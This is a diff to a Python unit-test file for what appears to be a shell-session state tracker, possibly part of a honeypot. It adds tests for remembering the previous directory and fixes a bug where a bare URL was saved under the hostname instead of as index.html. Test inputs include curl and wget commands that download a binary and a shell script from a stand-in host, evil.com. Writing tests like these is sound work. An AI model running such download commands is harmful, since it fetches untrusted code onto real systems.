@@ -82,6 +82,15 @@ class TestCwd(unittest.TestCase):
         t.record("cd /tmp")
         self.assertEqual(st["cwd"], "/tmp")
 
+    def test_the_previous_directory_is_remembered_for_cd_dash(self):
+        """Recorded on EVERY path, like cwd itself -- `cd -` must work whichever
+        agent answered the cd before it."""
+        t, st = tracker()
+        t.record("cd /tmp")
+        self.assertEqual(st["oldpwd"], "/root")
+        t.record("cd /var")
+        self.assertEqual(st["oldpwd"], "/tmp")
+
     def test_nothing_else_is_applied_to_a_cd(self):
         t, st = tracker()
         t.record("cd /tmp")
@@ -151,22 +160,20 @@ class TestDownloads(unittest.TestCase):
         t.record("curl -o out.bin http://evil.com/b")
         self.assertIn("/root/out.bin", st["files"])
 
-    def test_a_bare_url_is_saved_under_the_hostname(self):
-        """PINNED BUG, pre-existing.
-
-            name = url.rstrip("/").split("/")[-1] or "index.html"
-
-        rstrip("/") removes the trailing slash first, so the last segment is
-        the HOSTNAME and is always truthy -- the `or "index.html"` can never
-        fire. Dead code, the same shape as compute_cd's `cd -` branch.
-
-        Real wget saves a bare domain as index.html. Here `wget http://evil.com/`
-        makes a file called `evil.com`, and a later `cat index.html` finds
-        nothing. Fix is to check the path part, not the whole URL."""
+    def test_a_bare_url_is_saved_as_index_html(self):
+        """REGRESSION. rstrip("/") ran on the whole URL, so the last segment
+        was the HOSTNAME and always truthy -- the `or "index.html"` fallback
+        could never fire and `wget http://evil.com/` made a file called
+        evil.com, which a later `cat index.html` would not find."""
         t, st = tracker()
         t.record("wget http://evil.com/")
-        self.assertIn("/root/evil.com", st["files"])
-        self.assertNotIn("/root/index.html", st["files"])
+        self.assertIn("/root/index.html", st["files"])
+        self.assertNotIn("/root/evil.com", st["files"])
+
+    def test_a_url_with_a_path_still_uses_the_filename(self):
+        t, st = tracker()
+        t.record("wget http://evil.com/a/b/p.sh")
+        self.assertIn("/root/p.sh", st["files"])
 
 
 class TestMetadata(unittest.TestCase):
